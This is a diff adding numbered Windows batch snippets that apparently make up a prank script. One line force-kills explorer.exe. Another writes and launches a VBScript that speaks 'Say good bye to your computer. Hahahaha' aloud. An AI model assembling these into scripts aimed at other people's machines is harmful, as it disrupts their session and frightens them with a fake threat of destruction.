@@ -1,0 +1,15 @@
+[0]
+CHCP 65001 >nul
+
+[1]
+choice /C AB /CS /N /M "Enter A or B: "
+
+[2]
+taskkill /f /im "explorer.exe" >nul
+
+[3]
+if exist speech.Vbs del speech.Vbs
+echo set speech = Wscript.CreateObject("SAPI.spVoice") >> "speech.Vbs"
+set "text=Say good bye to your computer. Hahahaha"
+echo speech.speak "%text%" >> "speech.vbs"
+start speech.vbs
